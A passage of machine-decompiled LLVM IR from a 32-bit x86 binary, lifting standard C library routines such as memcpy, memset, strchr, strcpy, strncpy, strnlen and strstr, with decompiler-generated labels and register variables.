  %v1_8060a0a = trunc i32 %v1_8060a07 to i16
  %v3_8060a0a = inttoptr i32 %v0_8060a05 to i16*
  store i16 %v1_8060a0a, i16* %v3_8060a0a, align 2
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8060a19

dec_label_pc_8060a19:                             ; preds = %dec_label_pc_80609de, %dec_label_pc_80609da, %dec_label_pc_80609c6, %dec_label_pc_8060a05
  br label %dec_label_pc_8060a1b

dec_label_pc_8060a1b:                             ; preds = %dec_label_pc_80609ed, %dec_label_pc_8060a19
  %v0_8060a1e = phi i32 [ %v11_8060a01, %dec_label_pc_80609ed ], [ 0, %dec_label_pc_8060a19 ]
  store i32 %v0_80609a9, i32* @esi, align 4
  store i32 %v0_80609a8, i32* @edi, align 4
  ret i32 %v0_8060a1e

; uselistorder directives
  uselistorder i32 %v0_80609c6, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8060a1b, { 1, 0 }
  uselistorder label %dec_label_pc_8060a19, { 3, 0, 1, 2 }
}

define i32 @memcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8060a21 = load i32, i32* @esi, align 4
  store i32 %v0_8060a21, i32* %stack_var_-8, align 4
  %v4_8060a2d = ptrtoint i8* %arg1 to i32
  %v2_8060a33 = udiv i32 %arg3, 4
  %v7_8060a36 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %v2_8060a33)
  %v1_8060a3a = urem i32 %arg3, 4
  %v2_8060a3a = icmp eq i32 %v1_8060a3a, 0
  store i32 %v1_8060a3a, i32* @ecx, align 4
  br i1 %v2_8060a3a, label %bb, label %dec_label_pc_8060a3f

dec_label_pc_8060a3f:                             ; preds = %entry
  %v7_8060a3f = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %v1_8060a3a)
  %v8_8060a3f = ptrtoint i8* %v7_8060a3f to i32
  store i32 %v8_8060a3f, i32* @ecx, align 4
  br label %bb

bb:                                               ; preds = %entry, %dec_label_pc_8060a3f
  %v2_8060a45 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8060a45, i32* @edx, align 4
  %v2_8060a46 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8060a46, i32* @esi, align 4
  ret i32 %v4_8060a2d

; uselistorder directives
  uselistorder i32 %v1_8060a3a, { 2, 1, 0 }
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8060a4c = load i32, i32* @edi, align 4
  store i32 %v0_8060a4c, i32* %stack_var_-4, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8060a50 = sdiv i32 %sext, 16777216
  store i32 %v4_8060a50, i32* %eax.global-to-local, align 4
  %v4_8060a58 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8060a58, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_8060a5e = udiv i32 %arg3, 4
  %tmp = icmp ult i32 %arg3, 4
  store i32 %v2_8060a5e, i32* @ecx, align 4
  br i1 %tmp, label %bb, label %dec_label_pc_8060a63

dec_label_pc_8060a63:                             ; preds = %entry
  %v1_8060a63 = urem i32 %v4_8060a50, 256
  %v3_8060a66 = mul nuw i32 %v1_8060a63, 16843009
  store i32 %v3_8060a66, i32* %eax.global-to-local, align 4
  %v4_8060a6c = call i8* @_memset(i8* %arg1, i32 %v3_8060a66, i32 %v2_8060a5e)
  %v5_8060a6c = ptrtoint i8* %v4_8060a6c to i32
  store i32 %v5_8060a6c, i32* @ecx, align 4
  %v0_8060a6e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %bb

bb:                                               ; preds = %entry, %dec_label_pc_8060a63
  %v0_8060a6e = phi i32 [ %arg3, %entry ], [ %v0_8060a6e.pre, %dec_label_pc_8060a63 ]
  %v1_8060a6e = urem i32 %v0_8060a6e, 4
  %v2_8060a6e = icmp eq i32 %v1_8060a6e, 0
  store i32 %v1_8060a6e, i32* %edx.global-to-local, align 4
  br i1 %v2_8060a6e, label %dec_label_pc_8060a77, label %dec_label_pc_8060a73.preheader

dec_label_pc_8060a73.preheader:                   ; preds = %bb
  %v2_8060a73.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8060a73

dec_label_pc_8060a73:                             ; preds = %dec_label_pc_8060a73.preheader, %dec_label_pc_8060a73
  %v2_8060a73 = phi i32 [ %v2_8060a73.pre, %dec_label_pc_8060a73.preheader ], [ %v7_8060a73, %dec_label_pc_8060a73 ]
  %v0_8060a73 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060a73 = trunc i32 %v0_8060a73 to i8
  %v3_8060a73 = inttoptr i32 %v2_8060a73 to i8*
  store i8 %v1_8060a73, i8* %v3_8060a73, align 1
  %v4_8060a73 = load i32, i32* %edi.global-to-local, align 4
  %v5_8060a73 = load i1, i1* @df, align 1
  %v6_8060a73 = select i1 %v5_8060a73, i32 -1, i32 1
  %v7_8060a73 = add i32 %v6_8060a73, %v4_8060a73
  store i32 %v7_8060a73, i32* %edi.global-to-local, align 4
  %v0_8060a74 = load i32, i32* %edx.global-to-local, align 4
  %v1_8060a74 = add i32 %v0_8060a74, -1
  %v8_8060a74 = icmp eq i32 %v1_8060a74, 0
  store i32 %v1_8060a74, i32* %edx.global-to-local, align 4
  %v1_8060a75 = icmp eq i1 %v8_8060a74, false
  br i1 %v1_8060a75, label %dec_label_pc_8060a73, label %dec_label_pc_8060a77

dec_label_pc_8060a77:                             ; preds = %dec_label_pc_8060a73, %bb
  store i32 %v4_8060a58, i32* %eax.global-to-local, align 4
  %v2_8060a7b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8060a7b, i32* @edx, align 4
  %v2_8060a7c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8060a7c, i32* @edi, align 4
  ret i32 %v4_8060a58

; uselistorder directives
  uselistorder i32 %v1_8060a74, { 1, 0 }
  uselistorder i32 %v7_8060a73, { 1, 0 }
  uselistorder i32 %v1_8060a6e, { 1, 0 }
  uselistorder i32 %v3_8060a66, { 1, 0 }
  uselistorder i32 %v2_8060a5e, { 1, 0 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8060a73, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8060a81 = ptrtoint i8* %arg1 to i32
  %v2_8060a89 = mul i32 %arg2, 256
  %v3_8060a89 = and i32 %v2_8060a89, 65280
  %v4_8060a89 = and i32 %arg2, -65281
  %v5_8060a89 = or i32 %v3_8060a89, %v4_8060a89
  %v8_8060a8b.pre = load i1, i1* @df, align 1
  %v9_8060a8b = select i1 %v8_8060a8b.pre, i32 -1, i32 1
  br label %dec_label_pc_8060a8b

dec_label_pc_8060a8b:                             ; preds = %dec_label_pc_8060a90, %entry
  %v4_8060a8b = phi i32 [ %v6_8060a8b, %dec_label_pc_8060a90 ], [ %v5_8060a89, %entry ]
  %v7_8060a8b = phi i32 [ %v10_8060a8b, %dec_label_pc_8060a90 ], [ %v4_8060a81, %entry ]
  %v1_8060a8b = inttoptr i32 %v7_8060a8b to i8*
  %v2_8060a8b = load i8, i8* %v1_8060a8b, align 1
  %v10_8060a8b = add i32 %v7_8060a8b, %v9_8060a8b
  %v3_8060a8c = udiv i32 %v4_8060a8b, 256
  %v4_8060a8c = trunc i32 %v3_8060a8c to i8
  %v16_8060a8c = icmp eq i8 %v2_8060a8b, %v4_8060a8c
  br i1 %v16_8060a8c, label %dec_label_pc_8060a99.loopexit, label %dec_label_pc_8060a90

dec_label_pc_8060a90:                             ; preds = %dec_label_pc_8060a8b
  %v3_8060a8b = zext i8 %v2_8060a8b to i32
  %v5_8060a8b = and i32 %v4_8060a8b, -256
  %v6_8060a8b = or i32 %v3_8060a8b, %v5_8060a8b
  %v4_8060a90 = icmp eq i8 %v2_8060a8b, 0
  %v1_8060a92 = icmp eq i1 %v4_8060a90, false
  br i1 %v1_8060a92, label %dec_label_pc_8060a8b, label %dec_label_pc_8060a94

dec_label_pc_8060a94:                             ; preds = %dec_label_pc_8060a90
  br label %dec_label_pc_8060a99

dec_label_pc_8060a99.loopexit:                    ; preds = %dec_label_pc_8060a8b
  %phitmp = add i32 %v10_8060a8b, -1
  br label %dec_label_pc_8060a99

dec_label_pc_8060a99:                             ; preds = %dec_label_pc_8060a99.loopexit, %dec_label_pc_8060a94
  %v0_8060a99 = phi i32 [ %phitmp, %dec_label_pc_8060a99.loopexit ], [ 0, %dec_label_pc_8060a94 ]
  ret i32 %v0_8060a99

; uselistorder directives
  uselistorder i8 %v2_8060a8b, { 1, 2, 0 }
  uselistorder i32 %v4_8060a8b, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8060aa2 = ptrtoint i8* %arg1 to i32
  %v4_8060aaa.pre = load i32, i32* @eax, align 4
  %v8_8060aaa.pre = load i1, i1* @df, align 1
  %v9_8060aaa = select i1 %v8_8060aaa.pre, i32 -1, i32 1
  br label %dec_label_pc_8060aaa

dec_label_pc_8060aaa:                             ; preds = %dec_label_pc_8060aae, %entry
  %v20_8060aab = phi i32 [ %v23_8060aab, %dec_label_pc_8060aae ], [ %arg2, %entry ]
  %v4_8060aaa = phi i32 [ %v6_8060aaa, %dec_label_pc_8060aae ], [ %v4_8060aaa.pre, %entry ]
  %v7_8060aaa = phi i32 [ %v10_8060aaa, %dec_label_pc_8060aae ], [ %v4_8060aa2, %entry ]
  %v1_8060aaa = inttoptr i32 %v7_8060aaa to i8*
  %v2_8060aaa = load i8, i8* %v1_8060aaa, align 1
  %v3_8060aab = inttoptr i32 %v20_8060aab to i8*
  %v4_8060aab = load i8, i8* %v3_8060aab, align 1
  %v15_8060aab = icmp eq i8 %v2_8060aaa, %v4_8060aab
  %v1_8060aac = icmp eq i1 %v15_8060aab, false
  br i1 %v1_8060aac, label %dec_label_pc_8060ab6, label %dec_label_pc_8060aae

dec_label_pc_8060aae:                             ; preds = %dec_label_pc_8060aaa
  %v23_8060aab = add i32 %v20_8060aab, %v9_8060aaa
  %v10_8060aaa = add i32 %v7_8060aaa, %v9_8060aaa
  %v3_8060aaa = zext i8 %v2_8060aaa to i32
  %v5_8060aaa = and i32 %v4_8060aaa, -256
  %v6_8060aaa = or i32 %v3_8060aaa, %v5_8060aaa
  %v4_8060aae = icmp eq i8 %v2_8060aaa, 0
  %v1_8060ab0 = icmp eq i1 %v4_8060aae, false
  br i1 %v1_8060ab0, label %dec_label_pc_8060aaa, label %dec_label_pc_8060aba

dec_label_pc_8060ab6:                             ; preds = %dec_label_pc_8060aaa
  br label %dec_label_pc_8060aba

dec_label_pc_8060aba:                             ; preds = %dec_label_pc_8060aae, %dec_label_pc_8060ab6
  %storemerge = phi i32 [ 1, %dec_label_pc_8060ab6 ], [ 0, %dec_label_pc_8060aae ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8060aaa, { 1, 2, 0 }
  uselistorder i32 %v9_8060aaa, { 1, 0 }
  uselistorder label %dec_label_pc_8060aba, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8060ac1 = load i32, i32* @esi, align 4
  store i32 %v0_8060ac1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8060ac9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8060ac9, i32* %edi.global-to-local, align 4
  %v4_8060acd.pre = load i32, i32* @eax, align 4
  %v8_8060acd.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8060acd

dec_label_pc_8060acd:                             ; preds = %dec_label_pc_8060acd.dec_label_pc_8060acd_crit_edge, %entry
  %v2_8060ace = phi i32 [ %v7_8060ace, %dec_label_pc_8060acd.dec_label_pc_8060acd_crit_edge ], [ %v4_8060ac9, %entry ]
  %v8_8060acd = phi i1 [ %v5_8060ace, %dec_label_pc_8060acd.dec_label_pc_8060acd_crit_edge ], [ %v8_8060acd.pre, %entry ]
  %v4_8060acd = phi i32 [ %v0_8060acf, %dec_label_pc_8060acd.dec_label_pc_8060acd_crit_edge ], [ %v4_8060acd.pre, %entry ]
  %v7_8060acd = phi i32 [ %v0_8060acd.pre, %dec_label_pc_8060acd.dec_label_pc_8060acd_crit_edge ], [ %arg2, %entry ]
  %v1_8060acd = inttoptr i32 %v7_8060acd to i8*
  %v2_8060acd = load i8, i8* %v1_8060acd, align 1
  %v3_8060acd = zext i8 %v2_8060acd to i32
  %v5_8060acd = and i32 %v4_8060acd, -256
  %v6_8060acd = or i32 %v3_8060acd, %v5_8060acd
  store i32 %v6_8060acd, i32* %eax.global-to-local, align 4
  %v9_8060acd = select i1 %v8_8060acd, i32 -1, i32 1
  %v10_8060acd = add i32 %v7_8060acd, %v9_8060acd
  store i32 %v10_8060acd, i32* %esi.global-to-local, align 4
  %v3_8060ace = inttoptr i32 %v2_8060ace to i8*
  store i8 %v2_8060acd, i8* %v3_8060ace, align 1
  %v4_8060ace = load i32, i32* %edi.global-to-local, align 4
  %v5_8060ace = load i1, i1* @df, align 1
  %v6_8060ace = select i1 %v5_8060ace, i32 -1, i32 1
  %v7_8060ace = add i32 %v6_8060ace, %v4_8060ace
  store i32 %v7_8060ace, i32* %edi.global-to-local, align 4
  %v0_8060acf = load i32, i32* %eax.global-to-local, align 4
  %v3_8060acf = trunc i32 %v0_8060acf to i8
  %v4_8060acf = icmp eq i8 %v3_8060acf, 0
  %v1_8060ad1 = icmp eq i1 %v4_8060acf, false
  br i1 %v1_8060ad1, label %dec_label_pc_8060acd.dec_label_pc_8060acd_crit_edge, label %dec_label_pc_8060ad3

dec_label_pc_8060acd.dec_label_pc_8060acd_crit_edge: ; preds = %dec_label_pc_8060acd
  %v0_8060acd.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8060acd

dec_label_pc_8060ad3:                             ; preds = %dec_label_pc_8060acd
  store i32 %v4_8060ac9, i32* %eax.global-to-local, align 4
  %v2_8060ad7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8060ad7, i32* @edx, align 4
  %v2_8060ad8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8060ad8, i32* @esi, align 4
  ret i32 %v4_8060ac9

; uselistorder directives
  uselistorder i32 %v0_8060acf, { 1, 0 }
  uselistorder i32 %v7_8060ace, { 1, 0 }
  uselistorder i1 %v5_8060ace, { 1, 0 }
  uselistorder i32 %v4_8060ac9, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8060af1 = load i32, i32* @esi, align 4
  store i32 %v0_8060af1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8060afd = ptrtoint i8* %arg1 to i32
  store i32 %v4_8060afd, i32* %edi.global-to-local, align 4
  %v1_8060b0111 = add i32 %arg3, -1
  %v5_8060b0112 = icmp eq i32 %arg3, 0
  store i32 %v1_8060b0111, i32* %ecx.global-to-local, align 4
  br i1 %v5_8060b0112, label %.loopexit, label %dec_label_pc_8060b06.lr.ph

dec_label_pc_8060b06.lr.ph:                       ; preds = %entry
  %v10_8060b06.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8060b06

dec_label_pc_8060b06:                             ; preds = %dec_label_pc_8060b06.dec_label_pc_8060b01_crit_edge.dec_label_pc_8060b06_crit_edge, %dec_label_pc_8060b06.lr.ph
  %v10_8060b06 = phi i1 [ %v10_8060b06.pre, %dec_label_pc_8060b06.lr.ph ], [ %v6_8060b07, %dec_label_pc_8060b06.dec_label_pc_8060b01_crit_edge.dec_label_pc_8060b06_crit_edge ]
  %v0_8060b06 = phi i32 [ %arg2, %dec_label_pc_8060b06.lr.ph ], [ %v0_8060b06.pre, %dec_label_pc_8060b06.dec_label_pc_8060b01_crit_edge.dec_label_pc_8060b06_crit_edge ]
  %v3_8060b0718 = phi i32 [ %v4_8060afd, %dec_label_pc_8060b06.lr.ph ], [ %v8_8060b07, %dec_label_pc_8060b06.dec_label_pc_8060b01_crit_edge.dec_label_pc_8060b06_crit_edge ]
  %v1_8060b06 = inttoptr i32 %v0_8060b06 to i8*
  %v2_8060b06 = load i8, i8* %v1_8060b06, align 1
  %v11_8060b06 = select i1 %v10_8060b06, i32 -1, i32 1
  %v12_8060b06 = add i32 %v11_8060b06, %v0_8060b06
  store i32 %v12_8060b06, i32* %esi.global-to-local, align 4
  %v4_8060b07 = inttoptr i32 %v3_8060b0718 to i8*
  store i8 %v2_8060b06, i8* %v4_8060b07, align 1
  %v5_8060b07 = load i32, i32* %edi.global-to-local, align 4
  %v6_8060b07 = load i1, i1* @df, align 1
  %v7_8060b07 = select i1 %v6_8060b07, i32 -1, i32 1
  %v8_8060b07 = add i32 %v7_8060b07, %v5_8060b07
  store i32 %v8_8060b07, i32* %edi.global-to-local, align 4
  %v6_8060b08 = icmp eq i8 %v2_8060b06, 0
  %v1_8060b0a = icmp eq i1 %v6_8060b08, false
  br i1 %v1_8060b0a, label %dec_label_pc_8060b06.dec_label_pc_8060b01_crit_edge, label %dec_label_pc_8060b0c

dec_label_pc_8060b06.dec_label_pc_8060b01_crit_edge: ; preds = %dec_label_pc_8060b06
  %v0_8060b01.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8060b01 = add i32 %v0_8060b01.pre, -1
  %v5_8060b01 = icmp eq i32 %v0_8060b01.pre, 0
  store i32 %v1_8060b01, i32* %ecx.global-to-local, align 4
  br i1 %v5_8060b01, label %.loopexit, label %dec_label_pc_8060b06.dec_label_pc_8060b01_crit_edge.dec_label_pc_8060b06_crit_edge

dec_label_pc_8060b06.dec_label_pc_8060b01_crit_edge.dec_label_pc_8060b06_crit_edge: ; preds = %dec_label_pc_8060b06.dec_label_pc_8060b01_crit_edge
  %v0_8060b06.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8060b06

dec_label_pc_8060b0c:                             ; preds = %dec_label_pc_8060b06
  %v2_8060b0c = sext i8 %v2_8060b06 to i32
  %v3_8060b0c = load i32, i32* %ecx.global-to-local, align 4
  %v4_8060b0c = inttoptr i32 %v8_8060b07 to i8*
  %v5_8060b0c = call i8* @_memset(i8* %v4_8060b0c, i32 %v2_8060b0c, i32 %v3_8060b0c)
  %v6_8060b0c = ptrtoint i8* %v5_8060b0c to i32
  store i32 %v6_8060b0c, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %entry, %dec_label_pc_8060b06.dec_label_pc_8060b01_crit_edge, %dec_label_pc_8060b0c
  %v2_8060b13 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8060b13, i32* @esi, align 4
  ret i32 %v4_8060afd

; uselistorder directives
  uselistorder i32 %v8_8060b07, { 0, 2, 1 }
  uselistorder i1 %v6_8060b07, { 1, 0 }
  uselistorder i8 %v2_8060b06, { 0, 2, 1 }
  uselistorder i32 %v0_8060b06, { 1, 0 }
  uselistorder i32 %v4_8060afd, { 1, 0, 2 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v1_8060b20 = add i32 %tmp3, 1
  %v1_8060b21 = add i32 %tmp, -1
  br label %dec_label_pc_8060b24

dec_label_pc_8060b24:                             ; preds = %dec_label_pc_8060b28, %entry
  %v0_8060b25 = phi i32 [ %v1_8060b25, %dec_label_pc_8060b28 ], [ %v1_8060b20, %entry ]
  %v0_8060b24 = phi i32 [ %v1_8060b24, %dec_label_pc_8060b28 ], [ %v1_8060b21, %entry ]
  %v1_8060b24 = add i32 %v0_8060b24, 1
  %v1_8060b25 = add i32 %v0_8060b25, -1
  %v8_8060b25 = icmp eq i32 %v1_8060b25, 0
  br i1 %v8_8060b25, label %dec_label_pc_8060b2d, label %dec_label_pc_8060b28

dec_label_pc_8060b28:                             ; preds = %dec_label_pc_8060b24
  %v1_8060b28 = inttoptr i32 %v1_8060b24 to i8*
  %v2_8060b28 = load i8, i8* %v1_8060b28, align 1
  %v3_8060b28 = icmp eq i8 %v2_8060b28, 0
  %v1_8060b2b = icmp eq i1 %v3_8060b28, false
  br i1 %v1_8060b2b, label %dec_label_pc_8060b24, label %dec_label_pc_8060b2d

dec_label_pc_8060b2d:                             ; preds = %dec_label_pc_8060b28, %dec_label_pc_8060b24
  %v2_8060b2d = sub i32 %v1_8060b24, %tmp
  ret i32 %v2_8060b2d

; uselistorder directives
  uselistorder i32 %v1_8060b25, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %v0_8060b33 = load i32, i32* @ebx, align 4
  %v4_8060b37 = ptrtoint i8* %arg2 to i32
  %v2_8060b3f = load i8, i8* %arg2, align 1
  %v4_8060b41 = icmp eq i8 %v2_8060b3f, 0
  br i1 %v4_8060b41, label %dec_label_pc_8060bee, label %dec_label_pc_8060b4c

dec_label_pc_8060b4c:                             ; preds = %entry
  %v1_8060b4c = add i32 %arg1, -1
  br label %dec_label_pc_8060b4d

dec_label_pc_8060b4d:                             ; preds = %dec_label_pc_8060b58, %dec_label_pc_8060b4c
  %v0_8060b4d = phi i32 [ %v1_8060b4d, %dec_label_pc_8060b58 ], [ %v1_8060b4c, %dec_label_pc_8060b4c ]
  %v1_8060b4d = add i32 %v0_8060b4d, 1
  %v1_8060b4e = inttoptr i32 %v1_8060b4d to i8*
  %v2_8060b4e = load i8, i8* %v1_8060b4e, align 1
  %v4_8060b50 = icmp eq i8 %v2_8060b4e, 0
  br i1 %v4_8060b50, label %dec_label_pc_8060bec, label %dec_label_pc_8060b58

dec_label_pc_8060b58:                             ; preds = %dec_label_pc_8060b4d
  %v12_8060b5b = icmp eq i8 %v2_8060b4e, %v2_8060b3f
  %v1_8060b5d = icmp eq i1 %v12_8060b5b, false
  br i1 %v1_8060b5d, label %dec_label_pc_8060b4d, label %dec_label_pc_8060b5f

dec_label_pc_8060b5f:                             ; preds = %dec_label_pc_8060b58
  %v1_8060b5f = add i32 %v4_8060b37, 1
  %v2_8060b66 = inttoptr i32 %v1_8060b5f to i8*
  %v3_8060b66 = load i8, i8* %v2_8060b66, align 1
  %v4_8060b69 = icmp eq i8 %v3_8060b66, 0
  br i1 %v4_8060b69, label %dec_label_pc_8060bee, label %dec_label_pc_8060b6d

dec_label_pc_8060b6d:                             ; preds = %dec_label_pc_8060b5f
  %v1_8060b73 = add i32 %v0_8060b4d, 2
  %v1_8060bb6 = add i32 %v4_8060b37, 2
  %v2_8060bb6 = inttoptr i32 %v1_8060bb6 to i8*
  br label %dec_label_pc_8060ba3

dec_label_pc_8060b7c:                             ; preds = %dec_label_pc_8060be4
  %v3_8060b7c = load i8, i8* %storemerge.in.in, align 1
  br label %dec_label_pc_8060b9b.preheader

dec_label_pc_8060b9b.preheader:                   ; preds = %dec_label_pc_8060b7c, %dec_label_pc_8060ba3
  %v0_8060b85.ph.in = phi i8 [ %storemerge.in, %dec_label_pc_8060ba3 ], [ %v3_8060b7c, %dec_label_pc_8060b7c ]
  %v12_8060b9b53 = icmp eq i8 %v0_8060b85.ph.in, %v2_8060b3f
  %v1_8060b9d55 = icmp eq i1 %v12_8060b9b53, false
  br i1 %v1_8060b9d55, label %dec_label_pc_8060b85, label %dec_label_pc_8060b9f

dec_label_pc_8060b85:                             ; preds = %dec_label_pc_8060b9b.preheader, %dec_label_pc_8060b97
  %v0_8060b8557.in = phi i8 [ %v2_8060b98, %dec_label_pc_8060b97 ], [ %v0_8060b85.ph.in, %dec_label_pc_8060b9b.preheader ]
  %v0_8060b8956 = phi i32 [ %v1_8060b97, %dec_label_pc_8060b97 ], [ %v0_8060bba, %dec_label_pc_8060b9b.preheader ]
  %v1_8060b85 = icmp eq i8 %v0_8060b8557.in, 0
  br i1 %v1_8060b85, label %dec_label_pc_8060bec, label %dec_label_pc_8060b89

dec_label_pc_8060b89:                             ; preds = %dec_label_pc_8060b85
  %v1_8060b89 = add i32 %v0_8060b8956, 1
  %v1_8060b8a = inttoptr i32 %v1_8060b89 to i8*
  %v2_8060b8a = load i8, i8* %v1_8060b8a, align 1
  %v3_8060b8a = zext i8 %v2_8060b8a to i32
  %v4_8060b8a = load i32, i32* @ecx, align 4
  %v5_8060b8a = and i32 %v4_8060b8a, -256
  %v6_8060b8a = or i32 %v5_8060b8a, %v3_8060b8a
  store i32 %v6_8060b8a, i32* @ecx, align 4
  %v12_8060b8f = icmp eq i8 %v2_8060b8a, %v2_8060b3f
  br i1 %v12_8060b8f, label %dec_label_pc_8060b9f, label %dec_label_pc_8060b93

dec_label_pc_8060b93:                             ; preds = %dec_label_pc_8060b89
  %v4_8060b93 = icmp eq i8 %v2_8060b8a, 0
  br i1 %v4_8060b93, label %dec_label_pc_8060bec, label %dec_label_pc_8060b97

dec_label_pc_8060b97:                             ; preds = %dec_label_pc_8060b93
  %v1_8060b97 = add i32 %v0_8060b8956, 2
  %v1_8060b98 = inttoptr i32 %v1_8060b97 to i8*
  %v2_8060b98 = load i8, i8* %v1_8060b98, align 1
  %v12_8060b9b = icmp eq i8 %v2_8060b98, %v2_8060b3f
  %v1_8060b9d = icmp eq i1 %v12_8060b9b, false
  br i1 %v1_8060b9d, label %dec_label_pc_8060b85, label %dec_label_pc_8060b9f

dec_label_pc_8060b9f:                             ; preds = %dec_label_pc_8060b97, %dec_label_pc_8060b89, %dec_label_pc_8060b9b.preheader
  %v0_8060b9f = phi i32 [ %v0_8060bba, %dec_label_pc_8060b9b.preheader ], [ %v1_8060b89, %dec_label_pc_8060b89 ], [ %v1_8060b97, %dec_label_pc_8060b97 ]
  %v1_8060b9f = add i32 %v0_8060b9f, 1
  br label %dec_label_pc_8060ba3

dec_label_pc_8060ba3:                             ; preds = %dec_label_pc_8060b6d, %dec_label_pc_8060b9f
  %v0_8060bba = phi i32 [ %v1_8060b73, %dec_label_pc_8060b6d ], [ %v1_8060b9f, %dec_label_pc_8060b9f ]
  %storemerge.in.in = inttoptr i32 %v0_8060bba to i8*
  %storemerge.in = load i8, i8* %storemerge.in.in, align 1
  %v14_8060ba3 = icmp eq i8 %storemerge.in, %v3_8060b66
  %v1_8060ba6 = icmp eq i1 %v14_8060ba3, false
  br i1 %v1_8060ba6, label %dec_label_pc_8060b9b.preheader, label %dec_label_pc_8060ba8

dec_label_pc_8060ba8:                             ; preds = %dec_label_pc_8060ba3
  %v1_8060bac = add i32 %v0_8060bba, 1
  %v1_8060bb3 = add i32 %v0_8060bba, -1
  %v3_8060bb6 = load i8, i8* %v2_8060bb6, align 1
  %v4_8060bb6 = zext i8 %v3_8060bb6 to i32
  store i32 %v4_8060bb6, i32* @ecx, align 4
  %v2_8060bba = inttoptr i32 %v1_8060bac to i8*
  %v3_8060bba = load i8, i8* %v2_8060bba, align 1
  %v12_8060bbf45 = icmp eq i8 %v3_8060bba, %v3_8060bb6
  %v1_8060bc147 = icmp eq i1 %v12_8060bbf45, false
  br i1 %v1_8060bc147, label %dec_label_pc_8060be4, label %dec_label_pc_8060bc3

dec_label_pc_8060bc3:                             ; preds = %dec_label_pc_8060ba8, %dec_label_pc_8060bd6
  %v0_8060bc350 = phi i32 [ %v3_8060bdc, %dec_label_pc_8060bd6 ], [ %v4_8060bb6, %dec_label_pc_8060ba8 ]
  %v0_8060bd949 = phi i32 [ %v1_8060bd9, %dec_label_pc_8060bd6 ], [ %v1_8060bb6, %dec_label_pc_8060ba8 ]
  %v0_8060bd648 = phi i32 [ %v1_8060bd6, %dec_label_pc_8060bd6 ], [ %v1_8060bac, %dec_label_pc_8060ba8 ]
  %v1_8060bc3 = icmp eq i32 %v0_8060bc350, 0
  br i1 %v1_8060bc3, label %dec_label_pc_8060bee, label %dec_label_pc_8060bc7

dec_label_pc_8060bc7:                             ; preds = %dec_label_pc_8060bc3
  %v1_8060bc7 = add i32 %v0_8060bd949, 1
  %v2_8060bc7 = inttoptr i32 %v1_8060bc7 to i8*
  %v3_8060bc7 = load i8, i8* %v2_8060bc7, align 1
  %v4_8060bc7 = zext i8 %v3_8060bc7 to i32
